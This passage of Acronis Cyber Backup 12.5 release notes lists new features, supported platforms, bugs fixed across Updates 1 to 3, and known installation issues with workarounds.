  Previously, this operation was possible only under bootable media. The backup console allowed the recovery only if the machine's disk layout exactly matched that in the backup.

#### Acronis Cyber Backup appliance

* The 15-second timeout is removed from the Acronis Cyber Backup appliance installation menu. The installer waits for the user to review and confirm the settings.
* The CentOS kernel is updated in the Acronis Cyber Backup appliance, to address the Meltdown and Spectre threats.

#### Bootable media

It is possible to use any supported keyboard layout when working under bootable media. The set of layouts is defined in the LAYOUT kernel parameter.

#### Support for new operating systems

* Linux kernel versions 4.12 - 4.15
* Red Hat Enterprise Linux 7.5
* Ubuntu 17.10, 18.04
* Debian 9.3, 9.4
* Oracle Linux 7.4, 7.5

### New features available with the Advanced licenses only

#### Backup

The capability to configure a backup plan to use specific tape devices and tape drives.

#### Applications

Application-aware backup of Linux machines running Oracle Database.

#### Administering

The capability to create dynamic groups corresponding to Active Directory organizational units.

## Issues fixed in Update 3

This section describes issues that have been fixed in Update 3.

### Issues fixed in build 10130 (May 31, 2018)

#### Installation and upgrade

* [ABR-158404] Remote agent installation fails if the credentials for the target machine are specified in the "IP\username" format.
* [ABR-156822] The management server installation does not show any errors if the default 9877 port is already used by a third-party service on the machine.
* [ABR-156718] The management server installation on machine with "√ê¬¨" symbol in the hostname hangs on 99%.
* [ABR-155518] The management server crashes when installed on system if the hostname contains non-standard symbols (for example Chinese hieroglyphs).
* [ABR-152904] Remote update of agents on machines forcibly installs the Backup Monitor component even if it was not installed before.
* [ABR-150690] The "Show details" link in the backup email notifications points to a wrong management server address after updating Acronis Backup 12.5 from build 3869 or 7970.
* [ABR-150293] Windows Registry should be used to resolve the SID of the "Acronis Centralized Admin" Group instead of WMI calls during installation (remove dependency on WMI).
* [ABR-137669] The management server installed on CentOS 7 produces "Error 0x64ffff: Another instance of this application is already started." every minute in /var/log/messages.

#### Common

* [ABR-163794] Files/folders backup plan using [All Files] policy rule fails when applied to multiple machines.
* [ABR-163233] UEFI system restored to machine with UEFI Legacy mode (e.g. BIOS mode) enabled fails to boot with "NTLDR is missing" error.
* [ABR-162985] Test email notifications cannot be sent if the SMTP server does not respond within the 5 seconds time out (for example if the management server is located behind a firewall).
* [ABR-161579] Empty .zip package is downloaded when recovering folders that contain the "&" symbol in their names.
* [ABR-160870] Adding 20+ new backups into an existing backup replication plan causes the web console UI to fail (infinite loading).
* [ABR-160804] Acronis License Server service consumes ~10% of CPU unexpectedly.
* [ABR-160344] Recovery of files/folders prompts for user interaction in some cases when the "Silent mode" option is enabled.
* [ABR-158297] Refreshing recovery points fails if the agent which performs the operation is managing more than 1000 devices. Example of such agent is Agent for VMware connected to vSphere with huge amount (1000+) of virtual networks.
* [ABR-157146] Linux-based bootable media crashes when booting on a system with a specific 4TB+ external USB drive connected (example of USB drive model: Seagate SRD00F2).
* [ABR-156866] Sorting devices by name in the Devices list is performed separately for names starting with the same letter in upper and lower case.
* [ABR-156469] Copying files from the root folder of the archive while exploring it via Windows Explorer (double-click) causes the "No such interface supported" error.
* [ABR-155614] In some cases, disk/volume recovery fails with the "Cannot copy the disk" error if the source empty disk is larger than the target disk.
* [ABR-155192] The "Universal" licenses cannot be synced between the Acronis account and the management server.
* [ABR-153669] Files/folders backup of huge amount of files with the Version 12 backup format may hang when applying retention rules.
* [ABR-151106] The EN-GB keyboard layout is not available in Acronis Backup bootable media environment.
* [ABR-151077] Acronis system information files (/var/lib/Acronis/sysinfo\_\*\*\*) can be opened by unprivileged user, while it should not be possible.
* [ABR-150772] Backup plan creation fails with "Fail to obtain the lock on resource" in case there are more than 3000 machines registered on the management server.
* [ABR-150601] Renaming a backup plan while editing it from the Plans tab causes the plan to be saved (should stay in editing mode).
* [ABR-150370] Email notifications about successful backups are not sent if the "Activity not responding" alert was triggered during the plan execution.
* [ABR-150048] The Apply LVM/RAID option is not available in bootable media environment during Linux disks/volumes recovery.
* [ABR-150024] The 'service\_process' service crashes on CentOS 7.4 in some cases when the backup to a network share is performed using the Version 12 backup format.
* [ABR-149815] Backup using the Version 12 backup format fails if the backup chain contains incomplete (for example canceled) incremental or differential backups.
* [ABR-148911] Acronis services may crash when installed on a Linux system with connected "EMCpower" multipath devices.
* [ABR-148636] Agent appears as offline in the backup console if it is behind a proxy and the connection to the proxy server was temporarily lost.
* [ABR-148390] Incorrect "Backup status unknown" or "Agent being offline at scheduled time" alerts may be shown in some cases.
* [ABR-147976] Backup plan which uses "On the system shutdown" schedule condition (by event) starts the backup even if the system is rebooted.
* [ABR-147814] NTFS permissions are not restored when restoring files from disk/volume backup.
* [ABR-143797] Files/folders backup to the cloud storage fails with "The specified file does not exist" if the first backup was not completed (failed or canceled).
* [ABR-143678] Files/folders backup to the cloud storage may fail with "Internal error in library. The linked position is unknown." error.
* [ABR-142667] There is no "DNS suffix" option in the network configuration settings while creating a bootable media via Acronis Media Builder.
* [ABR-140753] Dashboard loads for more than 30 seconds in the web console interface if the are more than 4000 machines registered on the management server.
* [ABR-140143] Backup plan does not start on schedule when the start by "The backup location's host is available" event option is enabled.
* [ABR-139362] LUKS-encrypted LVM volumes are not backed up during the "Entire Machine" (disk/volume) backup.
* [ABR-130696] The "Files filters" option is not applied to Windows dynamic volumes.
* [ABR-129608] If a backup location was renamed then its name reverts to original after a backup to this location is performed.
* [ABR-117591] Full backup is always created on the first day of each month ignoring the "Weekly full, daily incremental" scheme settings.
* [ABR-108939] Removal of a Hyper-V host from the management server (by deleting Agent for Hyper-V) does not release a previously consumed Virtual Host license.

#### Roles and units management

* [ABR-158129] The email address of the administrator account is not shown in the web console after the management server is restarted.
* [ABR-156349] Login to the web console as an administrator fails when there are more than 8 units created in "Organization".

#### Acronis Storage Node, Acronis Storage and data catalog

* [ABR-164419] ManagementServer.exe, zmqgw.exe and StorageServer.exe may crash after backing up a disk with 10 000 000+ files due to extensive cataloging activities.
* [ABR-155526] Exporting a backup with the Version 12 backup format from a managed location via "acrocmd export archive" fails with "The archive is invalid or its type is unsupported." error.
* [ABR-148374] When Acronis Storage Node was upgraded from 11.7 and a new managed location is created on a network share, the credentials for it are stored in plain text within Acronis sqlite database files. The issue is not reproduced on clean installation.
* [ABR-146991] Backup to a location on Acronis Storage fails with "Failed to access the backups" if Acronis Storage along with the backup agent was re-registered on different management server.
* [ABR-135390] Full backups appear as "incremental" ones while browsing the backups in a managed location for a backup with the Version 12 backup format after retention rules were applied.
* [ABR-105287] Replication of files/folders backups between two managed locations based on network shares is slower than expected.

#### Virtualization

* [ABR-163751] In some cases deletion (unmounting) of a virtual machine running from a backup causes the "Cannot perform this operation with virtual machine '[Machine\_name]' twice." alerts to appear every hour.
* [ABR-157608] The sqlite database grows too fast on the agent which manages a huge virtual environment. Example of such agent is Agent for VMware connected to vSphere with huge amount (1000+) of virtual networks.
* [ABR-152647, ABR-160088] The "Files filters" backup option does not work properly when backup is performed by Agent for VMware (Virtual Appliance) and the full path to excluded/included folders is used without a trailing backslash (for example "C:\share").
* [ABR-152472] The list of Agents for VMware (virtual appliances or Windows agents) available for VM binding may become empty in highly loaded environments.
* [ABR-152008] VM recovery on Hyper-V 2016 successfully completes with "Failed to add resource to virtual machine" false warning in some cases.
* [ABR-150456] Hyper-V VM restored from backup of Windows 10/Windows 2012R2 (EFI) physical machine does not boot with the "NTLDR is missing" error.
* [ABR-144733] All policy rules, except for "[Disk #]", do not work for agentless backup of Linux VMs.
* [ABR-143835] A lot of "Reconfigure virtual machine" events are present in vSphere while backing up VMs which contain disks with empty NT signature. Example: AltLinux VMs.
* [ABR-141843] Recovery from a backup of a physical EFI CentOS 7 machine into a Gen2 Hyper-V VM via bootable media produces an unbootable system.
* [ABR-133681] A backup of an ESXi virtual machine fails if all of the following conditions are met: the backup is performed by Agent for VMware (Windows), the agent is installed in a non-English Windows, and Acronis Managed Machine Service is running under a system account whose name is localized. The following error appears: "You do not have access rights to this file."
* [ABR-132587] Backup of a vCenter appliance VM fails with a vCenter connection error when the backup is performed by Agent for VMware connected to this vCenter.
* [ABR-98984] VM backup or replication fails with "GXT: The item provider has skipped the report of an item with key '('995E4B11-5745-1C78-7F1A-B9CD7C9001BE','mms::vm::datastore')'" error when the VM hard disk or a connected ISO image is located on an inactive datastore. This error causes backup failure for all VMs included into backup plan, not only for affected one.

#### Tape management

* [ABR-150743] "Acronis" managed location on tape appears after the update from Acronis Backup 11.7 and cannot be deleted.
* [ABR-148839] Backup to a standalone tape with the "Eject tapes after each successful backup of each machine" option enabled fails when the tape reaches full capacity. It should prompt to install a new tape instead.
* [ABR-147449] The "Enable file recovery from disk backups stored on tapes" option is ignored and always enabled which causes tape location folder (which contains index of the files) to grow too fast.
* [ABR-130411] The "Eject tapes after each successful backup of each machine" option state is not saved in default backup options.

#### Application support

* [ABR-164665] Simultaneous backup of multiple Office 365 mailboxes may randomly fail with "URI is empty" error.
* [ABR-162461] Exchange Mailbox backup cannot be enabled when Acronis Backup is installed as "All-In-One" appliance.
* [ABR-150271] Backup of some Office 365 mailboxes fails with ".NET exception 'System.InvalidOperationException' has occurred: There is an error in XML document (1, 6998365)" error.
* [ABR-146976] Service\_process.exe occasionally crashes on applying retention rules if the SQL database backup contains more than 60 recovery points.
* [ABR-144148] Recovery and Validation activities fail with the "Failed to resolve item 'Session/Server/' by its reference." error for SQL database backups saved to Acronis Cloud after retention rules are applied.

## What's new in Update 2

### New features available in all on-premise deployments

#### Administering

* Administering user accounts is available on a management server that is installed in Linux

#### Installation and infrastructure

* Acronis Cyber Backup appliance for automatic deployment of Linux, the management server, Agent for Linux, and Agent for VMware (Linux) on a dedicated virtual machine
* When adding a Windows machine in the web interface, it is possible to select the name or IP address that the agent will use to access the management server
* Automatic and manual checks for updates

#### Security

* The backup console supports the HTTPS protocol out of the box
* The management server can use a certificate issued by a trusted certificate authority, instead of the self-signed certificate
* Non-root users can be added as administrators to a management server that is installed in Linux

#### Scheduling backups

* New scheduling options:
  + Waking up a machine for backup from the sleep or hibernation mode
  + Prevention of the sleep or hibernation mode during a backup
  + The option to prohibit running missed backups on a machine startup
* New backup start conditions, handy for backing up Windows laptops and tablets:
  + Save battery power
  + Do not start when on metered connection
  + Do not start when connected to the following Wi-Fi networks
  + Check device IP address
* In the Monthly schedule, selection of individual months during which backups will run
* The capability to start a differential backup manually

#### Backup locations

* Storing each machine's backups in a folder de√Ø¬¨¬Åned by a script (for machines running Windows)
* A locally deployed Acronis Storage can be used as a backup location

#### Applications

* Recovering Microsoft Office 365 mailboxes and mailbox items to Microsoft Exchange Server and vice versa

#### Support for new operating systems and virtualization platforms

* macOS High Sierra 10.13
* Debian 9.1 and 9.2
* Red Hat Enterprise Linux 7.4
* CentOS 7.4
* ALT Linux 7.0
* Red Hat Virtualization 4.1

#### Usability improvements

* Renaming locations on the Backups tab
* The capability to change the vCenter Server or ESXi that is managed by Agent for VMware in Settings > Agents > agent details

### New features available with the Advanced licenses only

#### Administering

* Creating units is available on a management server that is installed in Linux

#### Installation and infrastructure

* When adding a managed location, it is possible to select whether the agents will access the storage node by using the server name or IP address

#### Usability improvements

* Adding a managed location can be initiated from the storage node properties panel

#### Tape support

* Full support for the LTO-8 technology. See [Hardware Compatibility List](https://go.acronis.com/acronis-cyber-backup-advanced-tape-hcl "https://go.acronis.com/acronis-cyber-backup-advanced-tape-hcl") for the exact names of the tested devices.

## Issues fixed in Update 2

This section describes issues that have been fixed in Update 2.

### Issues fixed in build 9010 (January 30, 2018)

#### Installation and upgrade

* [TTASK-21608] Acronis Management Server service may fail to start after an update from build 7970 or higher.
* [ABR-148800] Acronis Management Server or Agent for Windows are not installed onto a read-only domain controller under Windows.

#### Common

* [ABR-150369] Acronis Scheduler service occasionally crashes on build 8850.
* [ABR-148883] Browsing an SMB share from Acronis bootable media or via Agent for VMware (Virtual Appliance) fails if credentials are not provided in the [hostname OR domain]\[User name] format. The error message now clearly indicates that credentials must be provided in the [hostname OR domain]\[User name] format.
* [ABR-148528] The Apply RAID/LVM option is missing from the recovery wizard in the Acronis bootable media environment when restoring backup of a Linux machine which contains LVM volumes.

#### Acronis Storage

* [ABR-145706] Backup to or browsing of a backup location on Acronis Storage fails with the "The agent's credentials are missing" message after an update from build 7970 or older builds.

#### Virtualization

* [ABR-150456] Conversion of a backup taken from a Windows 10/2012 R2 EFI physical machine into a Hyper-V VM produces a non-bootable VM ("NTLDR is missing" error).
* [ABR-149798] vSphere VM replication activity hangs at 10% and produces the "One or more required subsystems failed to initialize" error in some cases.
* [ABR-149413] Conversion into Hyper-V or ESXi VM fails with the "Cannot copy the disk because the available size of the target disk ({0, size}) is less than the required size ({1, size})" error if the backup contains an EFI machine inside and was taken via Agent for Windows/Linux.

#### Acronis Notary (ASign)

* [ABR-147778] The "Service is unavailable" error appears when verifying files that were backed up with the notarization enabled.

### Issues fixed in build 8850 (December 13, 2017)

#### Installation and upgrade

* [TTASK-21679] After an upgrade, the web backup console occasionally shows "Acronis Backup" on the blue background and loading stops at this stage.
* [ABR-146591] Acronis upgrade tool may fail when performing upgrade from versions 11.5/11.7 and some older builds of versions 12/12.5, thus causing Acronis Management Server service to crash.
* [ABR-142734] Acronis services running under the NetworkService system account fail to start if this account does not have access to the %temp% folder.
* [ABR-141626] Alerts on the agent are not generated during backup or other activities after updating Agent for VMware (Virtual Appliance) to the recent build.
* [ABR-140394] Acronis Cyber Backup Management Server Service fails to start if the management server is configured to use an external Microsoft SQL database and the connection password contains special characters (for example, % or #).
* [ABR-137452] If Acronis Cyber Backup Management Server is installed on Microsoft Hyper-V Server 2012 R2 Core, Acronis Service Manager Service fails to start because of missing files opengl32.dll, glu32.dll, and ddraw.dll (these .dll files are missing on Windows Core installations by default). This leads to the entire product malfunction.
* [ABR-135152] Acronis Cyber Backup installer hangs and becomes unresponsive when its window is dragged between two or more monitors on multi-monitor systems.
* [ABR-131248] An attempt to remotely install the agent to a 32-bit Windows machine from the management server running on a 64-bit machine fails with a misleading error message.

#### Common

* [ABR-142574] Acronis Managed Machine Service checks for the Acronis Centralized Admins group availability even when this check is not required. This may result in mms.exe process crashes on slow systems.
* [ABR-141635] Static IP network settings are not preserved when performing recovery under \_bootable media to the original machine, if the bootable media is connected to the management server and recovery is configured from the backup console. The issue is not reproduced when recovery is configured via the embedded user interface of the bootable media.
* [ABR-141235] File-level backup fails on a localized Windows XP SP3 due to localized names of Windows service folders (for example, Application Data) that contain locale-specific characters.
* [ABR-141033] Agents are not automatically moved between dynamic groups defined by the IP address criteria when the agent IP address changes.
* [ABR-139324] In Internet Explorer 11, the Settings > Licenses menu in the backup console may become unresponsive when more than 1000 licenses are added to the management server.
* [ABR-139267] Recovery from a file-level backup stored in the cloud storage to the original location with the Do not overwrite existing files option enabled does not recover files.
* [ABR-137665] The File filters option does not work if the path to a folder to be excluded ends with a slash character (for example, C:\temp\).
* [ABR-137613] Backing up a hidden SMB share fails. The following error appears: "File does not exist".
* [ABR-137385] Custom network settings defined while building a WinPE-based bootable media are not applied.
* [ABR-137148] Acronis Universal Restore is not available under WinPE-based bootable media.
* [ABR-136675] The Started by field in activities details shows an incorrect user for a scheduled plan that was started manually.
* [ABR-135509] On a machine with Agent for Linux, message "Assertion failed:" is written to /var/log/messages every 10 minutes.
* [ABR-135431] Acronis Startup Recovery Manager (ASRM) can start only if the English language is selected in the boot menu.
* [ABR-135267] After recovery of the system volume from a Windows 10 EFI-based machine backup to the original location, two items appear in the boot menu, instead of one as in the original system.
* [ABR-134739] Volumes protected by Bitlocker are not recognized by Acronis Cyber Backup Agent for Windows even after unlocking. Acronis Managed Machine Service needs to be restarted.
* [ABR-130709] If Acronis Cyber Backup Management Server host name cannot be resolved to IP from the machine where the agent is installed, backup plan execution may fail. The following error appears: "Cannot check the license due to a connection issue with the management server."
* [ABR-129816] File-level backup of an NFS v4 share contains no data.
* [ABR-128477] Backup to a network share by using the Version 12 backup format may fail with the "Input/output error" error message, if the connection to the share is lost and then is restored during the operation.
* [ABR-125700] Enabling an SSL-secured connection to the backup console as described in [https://kb.acronis.com/content/58130](https://kb.acronis.com/content/58130 "https://kb.acronis.com/content/58130") does not work.

  Note. Refer to the User Guide for the information about how to change the SSL certificate settings, thus enabling an SSL-secured connection to the backup console.
* [ABR-125422] In CentOS 7, backing up an ext4 partition with file/folder exclusions completes with "File exclusion is not supported" warning. The files are not excluded.
* [ABR-119894] Backing up to an SMB share hosted on a NAS device fails if the following conditions are met: the device also has an NFS server with the root ("/") directory exported; backup is performed under bootable media or by Agent for VMware (Virtual Appliance). An example of such NAS devices is NetApp Altavault.

  Note. While the fix for this bug enables backup to SMB shares, it is still not possible to back up directly to the NFS root export, e.g., to "nfs://[IP]/:/".
* [ABR-117799] Recovery from a backup of a non-initialized disk or a disk with unrecognized structure (from a sector-by-sector backup) fails. The following error appears: "Failed to write data to the disk. Access is denied".
* [ABR-114001] Backup fails if a partition selected for backup was physically removed from the machine. The error similar to the following one appears: "Cannot find item '\local\hd\_sign(A63B0C02)\part\_sn(62C456D4FC62C496)start(63895552)' selected for backup". It is also not possible to exclude this partition from the backup plan.
* [ABR-104069] The acrocmd list activities command output may show incorrect values in the Elapsed time and Estimated time columns for running activities.

#### Roles and units management

* [ABR-139735] If a user defined as a unit administrator was deleted from Active Directory or from local users of the machine, it is not possible to remove this user from the management server via Settings > Administrators.

#### Dashboard, reports, and alerting

* [ABR-140309] Instead of Daily activities and Alerts reports, a full dashboard report is created.
* [ABR-137630] Reports cannot be downloaded from the Dashboard or Reports tab if the management server is installed on Ubuntu.

#### Acronis Storage Node and data catalog

* [ABR-133661] After Java is updated on the machine running Catalog Service, data cataloging fails. The following error appears: "Couldn't connect to host at 'host\_name'".
* [ABR-135566] The mms.exe process may crash during backup to a managed location with deduplication enabled.
* [ABR-129426] Windows User Account Control (UAC) must be disabled on a machine where Acronis Storage Node is running. With UAC enabled, backups to the storage node fail. The following error appears: "Failed to establish connection using the specified credentials. If you are trying to connect to a managed machine, use the credentials of an 'Acronis Remote Users' security group member. To connect to a management server installed locally, use the credentials of an 'Acronis Centralized Admins' security group member. For remote connection to a management server, use the credentials of an account that is a member of both these security groups."
* [ABR-38271] During a validation of backups stored in managed locations, progress is incorrectly shown as 0 %.

#### Virtualization

* [ABR-141943] Agentless backup of vSphere virtual machines fails if a non-default port is used for connection to the vCenter, instead of the default 443 one.
* [ABR-139974] Backup of a virtual machine running on Microsoft Windows 2008 with Hyper-V role enabled fails if the virtual machine has a static MAC address. The following error appears: "Failed to obtain property 'AllowMacSpoofing'".
* [ABR-138661] Agent for VMware (Virtual Appliance) always tries to connect to the management server by using the server's host name, even if the connection by IP was defined during the appliance deployment.
* [ABR-138478] Backing up ESXi configuration fails if Agent for SQL is installed on the machine with the management server. The following error appears: "POR: Branch 'ProviderId' cannot be found".
* [ABR-132985] Deploying Agent for VMware (Virtual Appliance) from an OVF template via ESXi 6.5 Host Client fails. The following error appears: "postNFCData failed".
* [ABR-129688] An ESXi virtual machine converted from a backup of a Linux machine created by Agent for Linux may not start on an ESXi host due to an incorrect "Guest OS" property set to "Other Linux (32-bit)".
* [ABR-104538] It is not possible to use Agent for VMware (Windows) if Acronis Cyber Backup Management Server is installed on a machine running Linux.
* [ABR-81335] Virtual machines are not shown in the device list if an ESXi host included into a vSphere cluster is directly selected in the navigation tree.

#### Tape management

* [ABR-140985] Recovery of files or folders from a version 11.7 backup stored in a managed tape-based location fails after upgrade to version 12.5.
* [ABR-139651] Parallel backup from multiple machines to a managed tape-based location may fail with an input/output error.
* [ABR-136132] The Overwrite a tape in the stand-alone tape drive when creating a full backup option does not work if the Version 11 backup format is used.
* [ABR-135596] If the Eject tapes after each successful backup of each machine option is enabled, a backup plan fails and the tape is not ejected. The following error appears: "Failed to connect to the storage node". The issue applies to stand-alone tape drives only.

#### Agent for Mac

* [ABR-108598] When selecting a folder that contains a special control character (\r) in its name, the following error appears: "URI is invalid: Incorrect symbol encountered".

#### Application support

* [ABR-140290] A single-pass backup of a machine running Agent for SQL to an SMB share completes with warnings if the backup share was specified as smb://server/share (without a slash character in the end). The following warnings appear: "Error occurred while opening the file.", "Failed to set the logon information for the backup location."
* [ABR-137524] An incremental backup of SQL databases may hang while processing huge databases.
* [ABR-121741; ABR-110133] A backup plan applied to multiple Office 365 mailboxes completes with warnings if some of the mailboxes were physically deleted. It is also not possible to exclude these deleted mailboxes from the backup plan.

## What's new in Update 1

* Mass deployment and upgrade utility for unattended agent deployment.

  For information about how to use this utility, refer to the following Acronis Knowledge Base article: [https://kb.acronis.com/content/60137](https://kb.acronis.com/content/60137 "https://kb.acronis.com/content/60137")
* Detailed managed location statistics are now shown on the location information window.

## Issues fixed in Update 1

This section describes issues that have been fixed in Update 1.

### Issues fixed in build 7970 (September 14, 2017)

#### Installation and upgrade

* [ABR-138006] Installation of Acronis Cyber Backup fails if the root certificate check fails. The following error appears: "Error 0xfff0: A certificate chain could not be built to a trusted root authority."

  Solution: The certificate check can now be skipped during installation.
* [ABR-131248] Links to the 32-bit installer are broken on the instructions page when trying to install Agent for Windows remotely to a 32-bit machine from Acronis Management Server running on a 64-bit machine.

#### Common

* [ABR-137070] Backup via acrocmd of a remote machine booted under WinPE-based bootable media fails. The following error appears: "Not enough privileges to perform the operation with the disks. The 'Backup files and directories' (SeBackupPrivilege) and 'Restore files and directories' (SeRestorePrivilege) privileges are required."
* [ABR-137061] In some cases, logs of backup replication plans may contain credentials for the source or target backup location in plain text.
* [ABR-135566] Backup to a location managed by Acronis Storage Node fails. The following error appears: "The locations are not initialized yet. Please try again later after the storage node is completely initialized." After that, the mms.exe process crashes.
* [ABR-135267] After an EFI machine running Windows 10 is recovered and booted, an additional second boot option appears unexpectedly.
* [ABR-134448] A hidden network share cannot be saved as a backup source in a backup plan: the Items to back up field remains empty.

#### Roles and units management

* [ABR-138229] Active Directory user accounts with the Display name value set in a non-English language are shown as "???? ????" in the backup console when adding unit administrators.

#### Active Protection

* [ABR-136876] In some cases, Active Protection activities are shown with the "UNTRANSLATED" summary in the backup console.
* [ABR-135331] After applying an Active Protection plan, an unexpected "Active Protection service is not running" alert may appear in the backup console.

### Issues fixed in build 7641 (August 5, 2017)

#### Installation and upgrade

* [ABR-133606] In some cases after upgrading from Acronis Cyber Backup 11.7, backup plans are lost, due to problems with access to the Acronis Cyber Backup Management Server database.
* [ABR-133396] In some cases after upgrading from Acronis Cyber Backup 12/11.5/11.7, new backup plans cannot be created. The following error appears: "Failed to add account in user profile."
* [ABR-132880] After upgrading from Acronis Cyber Backup 11.7, the "Internal server error 100011" message may appear in the backup console.
* [ABR-132756] Upgrading backup plan activities may fail during upgrade from Acronis Cyber Backup 11.7 Advanced. The following error appears: "POR: Cannot access property by path '.MachineAddress'."
* [ABR-132350] After upgrading from Acronis Cyber Backup 12, e-mail notifications of successful backups are not sent.
* [ABR-131984] In some cases, upgrading from Acronis Cyber Backup 11.7 hangs on 90% for a very long time.
* [ABR-131872] Acronis Cyber Backup Management Server fails to run on the same machine with VMware vCenter Server due to the 8089 port conflict.
* [ABR-131343] After upgrading from Acronis Cyber Backup 11.5/11.7, the user cannot open or mount an archive file in Windows Explorer.
* [ABR-130913] After upgrading from Acronis Cyber Backup 11.5/11.7, the default e-mail notification settings are not preserved.
* [ABR-122292] Recovering from Microsoft Exchange CDP archives that were created by Acronis Cyber Backup 11.5 / 11.7 fails. The following error appears: "The operation is not supported."

#### Common

* [ABR-132794] An Active Protection plan cannot be applied to a machine with the Universal license assigned due to improperly applied licensing restrictions.
* [ABR-131006] The update notification indicator (Settings > Agents tab) shows an incorrect number of agents that need to be updated.
* [ABR-130967] The backup deletion fails if the backup is located on a USB flash drive. The following error appears: "An unsupported URI is specified."
* [ABR-130477] Backing up to Acronis Cloud Storage fails and does not re-try properly when the computer loses connection to a selected Wi-Fi network and connects to a different Wi-Fi network.
* [ABR-130115] Conversion of a BIOS-based operating system to UEFI is not performed when using the backup console to recover a machine to dissimilar hardware.
* [ABR-126484] The Capacity column shows incorrect information about the space occupied by backups for managed locations on network shares.
* [ABR-126042] The backup validation activity shows an incorrect progress indicator.
* [ABR-121569] The backup splitting option is not applied when the backup format is set to Version 12.

#### Roles and units management

* [ABR-131855] The "AccountServer.UserGroupNotFound" error appears when clicking the Administrators tab if there are deleted Windows accounts/groups in the list.
* [ABR-124308] When installing a backup agent or Acronis Storage Node, the list of units is not sorted on the Select unit dialog.

#### Dashboard, reports and alerting

* [ABR-122810] Alerts generated upon plan execution failure are not displayed on the Alerts tab for plans other than backup plans. The issue affects separate Validation, Backup replication and Conversion to VM plans.

#### Acronis Notary (ASign)

* [ABR-129554] Files from encrypted backups located in Acronis Cloud Storage cannot be signed with the Sign this file version command.

#### Virtualization

* [ABR-130030] Conversion of a backup into a Hyper-V virtual machine fails if the backup is created by using direct volumes selection. The following error appears: "No free space."
* [ABR-125939] After Agent for Hyper-V is installed, virtual machines from the Hyper-V host may appear on the Devices tab in the backup console with a 10-minute delay.

#### Tape management

* [ABR-129951] File recovery from a tape-based location may result in a warning if the following conditions are met: the disk-level backup has the Version 12 format and the Use a disk cache to accelerate the recovery recovery option is enabled. The following message appears: "Internal error: not supported." In fact, the disk cache is not used during the recovery operation.

#### Application support

* [ABR-133093] Searching for elements within Office 365 backups returns all e-mails instead of the ones that match the search criteria.
* [ABR-133091] Mailbox recovery from backups of Exchange 2016 Cumulative Update 5 does not work.
* [ABR-129938] Acronis Managed Machine service may not stop properly on a machine running Microsoft Exchange.

## What's new in Acronis Backup

* Unique! Acronis Active Protection to proactively detect and protect systems from ransomware attacks.
* Centralized backup policies, static and dynamic groupings, and the ability to manage, delegate, and establish roles for multiple administrators - all to support larger environments and greater volumes of data.
* Customizable dashboards and advanced reporting for quick insights into your entire IT infrastructure.
* Unique! Backup of XenServer, Linux KVM, Red Hat Enterprise, Virtualization, and Oracle VM Server for complete protection of any virtual environment.
* Support for tape drives, autoloaders, and tape libraries for off-site storage to ensure compliance with company regulations.
* Off-host backup management operations, including staging (moving), replication (copying), validation, and retention (cleanup) of backups.
* Unified, web-based, touch-friendly, centralized management console to reduce management complexity.
* Unique! Protection for VMware vSphere ESX(i) and Microsoft Hyper-V hosts and VMs for complete protection of any virtual workload.
* VMware VM replication with WAN optimization for faster disaster recovery
* Unique! Acronis Instant Restore (Run Backup as a VM) and vmFlashback for VMware & Hyper-V to reduce recovery time objectives (RTOs).
* SAN storage snapshots support for VMware backups to reduce ESXi resource utilization.
* Remote and automated bootable media for significant reduction of the RTO of remote systems and data centers.

## Issues fixed in Acronis Backup

This section describes issues that have been fixed in Acronis Backup, as compared to Acronis Backup 12 Update 3.

### Common

* [ABR-108446] After upgrading from Acronis Backup 11.5/11.7, the backup plans that replicate backups to two or more locations fail. The problem does not affect backup plans with one additional backup location defined (second destination).
* [ABR-110899, ABR-108804] Starting a trial is not possible when backing up SQL Server databases.
* [ABR-110713] Low performance when copying files from a .tib file that is opened via the Windows Explorer shell extension.
* [ABR-108066] Recovery of physical machine to virtual (P2V) performed by Agent for VMware or Agent for Hyper-V completes successfully, but the activity contains the warning "Failed to get the object's property 'ManagedHost'."
* [ABR-107545] The message about missing licenses remains on the backup plan creation panel even after adding valid licenses.
* [ABR-88247] Search by device name on the Activities tab is case-sensitive.

### Virtualization

* [ABR-111052] Backing up a VMware vSphere 6.5 virtual machine with an NVMe controller fails. The following error appears: "You do not have access rights to this file."
* [ABR-117801] After recovering a virtual machine with the PVRDMA network adapter to a new virtual machine, the recovered virtual machine has the VMXNET3 network adapter.
* [ABR-119508] After replicating to an existing encrypted virtual machine, the replicated virtual machine cannot be powered on. The following error appears: "Module 'Nvman' power on failed."
* [ABR-119529] VMware vSphere 6.5 virtual machines that reside on VMFS 6.0 datastores cannot be backed up by using the SAN transport mode.
* [ABR-104133] Email notification options are missing when creating a VM replication plan.
* [ABR-90170] Backup activities may not be shown when you select a virtual machine and click Activities.

### Application support

[ABR-104004] A contact name is shown twice in "Business address", when browsing Exchange mailbox items in a database backup.

* [ABR-102816] Acronis Management Server consumes excessive amount of RAM during recovery of large number of Exchange mailboxes (200+).

## Known issues

This section describes issues that are currently known and provides solutions to avoid the issues where possible.

### Installation and upgrade

Acronis Cyber Backup 12.5 can upgrade Acronis Cyber Backup 11.5, 11.7, and 12. For more information about the upgrade procedure, refer to the following Acronis Knowledge Base article: <https://kb.acronis.com/content/59801>

* [ABR-218875] [Update 4] Creating a backup plan fails after the management server running under a real user account has been reinstalled with the Create a new account option (the Remove the logs and configuration settings checkbox cleared). The following error appears: "Windows error: (0x80070005) Access is denied".

  Solution: Reinstall the management server and specify the same user account that was used for the initial installation.
* [ABR-217534] [Update 4]A backup agent that uses HTTP/HTTPS proxy for cloud backup must resolve the hostnames of Acronis cloud servers (for example "baas-fes-us3.acronis.com") even though DNS redirection is set up within the proxy server.
* [ABR-195114] The mms.exe process sometimes crashes on start after a remote agent update.

  Solution: Restart the machine after the update is finished.
* [ABR-144289] Deploying Acronis Cyber Backup appliance from an OVF template to ESXi hosts of version 5.1 or lower produces a virtual machine with a wrong guest OS type: "Other (32-bit)". This results in an appliance malfunction.

  Solution: Change the guest OS type of the appliance virtual machine to "Other 3.x or later Linux (64-bit)" via the vSphere client.
* [ABR-143693] Deploying Acronis Cyber Backup appliance from an OVF template fails when using vSphere Web Client on vCenter version 6.5 U1 build 5973321. It is because this version of vCenter does not support deployment from OVF templates, only the OVA format is supported.

  Solution: Prepare a virtual machine for Acronis Cyber Backup appliance manually, as described in User Guide, and boot it from the Acronis Cyber Backup appliance .iso to proceed with the installation.
* [ABR-142841] One cannot boot an EFI machine from the Acronis Cyber Backup appliance .iso.

  Solution: Use a BIOS machine.
* [ABR-142560] Deploying Acronis Cyber Backup appliance from an OVF template does not work when using vSphere Host Client on ESXi version 6.5. The following error appears: "A required disk image was missing".

